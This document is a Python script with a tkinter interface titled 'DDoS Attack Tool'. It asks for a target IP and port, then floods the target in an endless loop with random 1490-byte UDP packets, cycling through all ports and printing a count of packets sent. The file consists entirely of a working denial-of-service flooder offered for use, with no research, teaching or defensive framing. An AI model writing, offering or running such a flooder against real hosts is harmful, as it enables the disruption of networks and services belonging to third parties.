import sys
import os
import time
import socket
import random
from datetime import datetime
import tkinter as tk
from tkinter import messagebox

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

def start_attack(ip, port):
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        if port == 65534:
            port = 1
        print("Packet %s sent to %s through port %s"%(sent, ip, port))

def on_start():
    ip = entry_ip.get()
    port = int(entry_port.get())
    if ip and port:
        messagebox.showinfo("Info", "Attack started!")
        start_attack(ip, port)
    else:
        messagebox.showerror("Error", "Please enter both IP and Port.")

# Create the main window
root = tk.Tk()
root.title("DDoS Attack Tool")

# Set window size
root.geometry("400x300")

# Set window icon
root.iconbitmap('Exworizz.ico')

# Set background color
root.configure(bg='lightblue')

# Create and place the IP entry
tk.Label(root, text="Target IP:", bg='lightblue').pack(pady=5)
entry_ip = tk.Entry(root)
entry_ip.pack(pady=5)

# Create and place the Port entry
tk.Label(root, text="Target Port:", bg='lightblue').pack(pady=5)
entry_port = tk.Entry(root)
entry_port.pack(pady=5)

# Create and place the Start button
btn_start = tk.Button(root, text="Start Attack", command=on_start)
btn_start.pack(pady=20)

# Run the main loop
root.mainloop()
